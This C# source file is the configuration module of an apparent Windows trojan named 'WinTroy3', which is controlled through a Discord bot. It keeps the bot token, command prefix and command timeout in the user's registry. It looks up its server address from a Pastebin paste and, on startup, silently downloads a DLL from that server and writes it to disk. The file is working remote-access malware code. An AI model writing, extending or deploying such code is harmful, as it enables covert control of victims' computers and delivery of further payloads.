using Discord;
using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Threading.Tasks;
using static WinTroy3_PluginLib.Reg;

namespace WinTroy3_PluginLib
{
    public static class Config
    {
        public static class BotConfig
        {
            public static void Init()
            {
                InitValue("CTO", 2500, RegistryValueKind.DWord);
                InitValue("", "std", RegistryValueKind.String);
                InstallNatrium().GetAwaiter();
            }

            private static async Task InstallNatrium()
            {
                var client = new HttpClient();
                var url = $"{PathConfig.GetBaseUrl()}Assemblies/Ref/Natrium.dll";
                HttpResponseMessage response = await client.GetAsync(url);
                File.WriteAllBytes(
                    Path.GetFullPath("\\Sodium.dll"),
                    await response.Content.ReadAsByteArrayAsync());
            }

            public static void InitValue(string valueName, object value, RegistryValueKind kind)
            {
                using (
                    RegistryKey key = Registry.CurrentUser.OpenSubKey(PathConfig.RegPath, true)
                    ?? Registry.CurrentUser.CreateSubKey(PathConfig.RegPath))
                {
                    if (key.GetValue(valueName) == null)
                        key.SetValue(valueName, value, kind);
                }
            }

            public static void SetCmdTimeout(int value)
            {
                SetInt("CTO", value);
            }

            public static int GetCmdTimeout()
            {
                return GetInt("CTO");
            }

            public static void SetToken(string token)
            {
                SetString("DCBT", token);
            }

            public static string GetToken()
            {
                return GetString("DCBT");
            }

            public static void SetPrefix(string prefix)
            {
                SetString("DCPF", prefix);
            }

            public static string GetPrefix()
            {
                return GetString("DCPF") ?? string.Empty;
            }
        }

        public static class ClientConfig
        {
            public static bool IsDebugOutputEnabled()
            {
                return GetDefault().Contains("enable-output");
            }

            public static string GetDefault()
            {
                return GetString("") ?? string.Empty;
            }
        }

        public static class PathConfig
        {
            public static readonly string RegPath = "SOFTWARE\\WT3";
            public static readonly string MenuDataRegPath = RegPath + "\\data";

            public static string GetBaseUrl()
            {
                return GetBaseUrlAsync().GetAwaiter().GetResult();
            }

            public async static Task<string> GetBaseUrlAsync()
            {
                HttpResponseMessage response =
                    await new HttpClient().GetAsync("https://pastebin.com/raw/SYc5Jv8i");
                response.EnsureSuccessStatusCode();
                return await response.Content.ReadAsStringAsync();
            }

            public static string GetSub(string subFolder)
            {
                return Path.Combine(GetRoot(), subFolder + "\\");
            }

            public static string GetRoot()
            {
                return Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
            }

            public static string GetTempPath()
            {
                return GetSub("Temp");
            }
        }
    }
}
